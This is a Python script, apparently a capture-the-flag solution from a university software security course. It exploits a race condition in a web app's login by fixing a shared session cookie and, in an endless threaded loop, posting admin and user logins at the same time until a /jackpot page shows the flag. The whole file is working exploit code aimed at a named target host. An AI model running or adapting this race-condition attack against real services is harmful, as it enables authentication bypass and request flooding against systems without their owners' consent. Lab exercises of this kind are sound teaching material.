import requests
import re
from threading import Thread 
import threading
from functools import partial
import sys

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22652'

# Start session
session = requests.session()
r = session.get(SERVER)

# Set JTOKEN so it stays the same for all requests
session.cookies.set('JTOKEN', '7b2d0d9db004ed2ae29546511ec7de7295c2bca5cdcb1b4a14c860a1353020157231ab36139a2c40fa8946691092f84052426c168d405429b521add3433c31f6', domain="mustard.stt.rnl.tecnico.ulisboa.pt", path='/')

dataAdmin = {"username": 'admin', "password":'test'}
dataUser = {"username": 'test', "password":'test'}
 
def admin(): 
    r = session.post(SERVER + "/login",data=dataAdmin)
    r = session.post(SERVER + "/login",data=dataAdmin)
    r = session.get(SERVER + "/jackpot")
    if r.text.find('SSof{') != -1:
        print(r.text)

def user(): 
    r = session.post(SERVER + "/login",data=dataUser)
    r = session.get(SERVER + "/jackpot")
    

# admin and user functions are running at the same 
while True:
    Thread(target=partial (admin,)).start() 
    user()